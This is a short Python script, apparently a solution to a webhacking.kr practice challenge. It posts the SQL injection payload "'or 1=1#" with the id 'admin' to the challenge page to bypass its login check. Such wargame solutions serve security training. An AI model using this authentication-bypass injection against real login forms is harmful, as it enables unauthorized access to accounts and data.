import requests

if __name__ == '__main__':
    url = "https://webhacking.kr/challenge/web-03/index.php"
    data = {"answer": "'or 1=1#", "id": "admin"}
    cookies = {"PHPSESSID": ""}

    response = requests.post(url, data=data, cookies=cookies)
    print(response.text)
